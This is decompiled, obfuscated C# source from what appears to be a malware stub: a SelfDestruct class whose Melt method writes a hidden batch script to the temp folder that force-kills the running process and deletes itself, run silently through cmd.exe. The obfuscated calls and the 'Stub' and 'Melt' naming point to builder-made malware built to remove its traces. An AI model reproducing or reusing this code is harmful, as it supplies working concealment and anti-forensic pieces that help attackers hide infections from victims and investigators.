using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000A9 RID: 169
	internal sealed class SelfDestruct
	{
		// Token: 0x0600025A RID: 602 RVA: 0x00017448 File Offset: 0x00015648
		public static void Melt()
		{
			string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".bat");
			int id = Process.GetCurrentProcess().Id;
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine("chcp 65001");
					streamWriter.WriteLine(string.Format("taskkill /F /PID {0}", id));
					streamWriter.WriteLine("timeout /T 2 /NOBREAK > NUL");
					streamWriter.WriteLine("del /F /Q \"" + text + "\"");
				}
				Logging.Log("SelfDestruct: Initiating self-destruct procedure...", true);
				ProcessStartInfo processStartInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C \"" + text + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				};
				Process.Start(processStartInfo);
				Thread.Sleep(5000);
				Environment.FailFast(null);
			}
			catch (Exception ex)
			{
				Logging.Log("SelfDestruct: Failed to execute self-destruct procedure. Error: " + ex.Message, true);
			}
		}

		// Token: 0x0600025B RID: 603 RVA: 0x000038B4 File Offset: 0x00001AB4
		public SelfDestruct()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600025C RID: 604 RVA: 0x000038AD File Offset: 0x00001AAD
		static SelfDestruct()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
